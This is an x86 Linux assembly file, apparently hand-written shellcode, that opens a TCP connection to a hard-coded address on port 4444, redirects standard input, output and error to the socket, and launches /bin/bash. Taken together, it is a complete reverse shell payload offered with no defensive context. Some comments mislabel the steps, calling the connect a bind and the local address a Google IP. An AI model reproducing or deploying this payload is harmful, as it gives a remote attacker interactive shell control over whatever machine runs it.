global _start



section .text

_start:

	; socket creation
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	xor esi,esi
	xor edi,edi
	
	; s = socket(2,1,6)
	push eax
	push 0x6 
	push 0x1
	push 0x2
	mov ecx,esp
	mov al,0x66
	mov bl,0x1
	int 0x80

	mov edi,eax

	;socket struct defining variables    connect(s,[2,4444,ip],16)
	push edx
	push edx
	push 0xa9e6a8c0   ; google ip to hex , here the eth0 
	push word 0x5c11
	push word 0x2
	mov esi,esp
 	
	;socket bind call
	xor eax,eax
	xor ebx,ebx

	push 0x10
	push esi
	push edi
	mov ecx,esp
	mov al,0x66
	mov bl,0x3
	int 0x80


	;std
	mov ebx,edi ; file  descriptor is the same old one importante
	xor ecx,ecx

	mov al,0x3f
	int 0x80

	inc ecx
	mov al,0x3f
	int 0x80

	inc ecx
	mov al,0x3f
	int 0x80


	;////bin/bash
	xor eax,eax
	push eax
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f
	mov ebx,esp

	push eax
	push ebx
	mov ecx,esp

	mov al,11
	xor edx,edx
	int 0x80
